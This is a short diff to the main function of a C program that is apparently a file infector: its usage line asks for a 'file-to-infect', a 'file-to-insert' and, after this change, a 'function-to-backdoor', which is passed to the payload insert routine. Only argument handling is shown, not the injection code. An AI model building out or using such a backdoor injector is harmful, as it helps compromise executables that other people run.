@@ -25,7 +25,7 @@ int main(int argc, char **argv)
 
     // We check if the usage is correct
     if (argc != EXPECTED_ARGC) {
-	    fprintf(stderr, "Usage: %s <file-to-infect> <file-to-insert>\n", argv[0]);
+	    fprintf(stderr, "Usage: %s <file-to-infect> <file-to-insert> <function-to-backdoor>\n", argv[0]);
 	    exit(EXIT_FAILURE);
     }
 
@@ -41,7 +41,7 @@ int main(int argc, char **argv)
 
     check_payload_place(payload_size);
 
-    insert(to_infect_content, payload, to_infect_size, payload_size);
+    insert(to_infect_content, payload, to_infect_size, payload_size, argv[3]);
 
     free(to_infect_content);
 
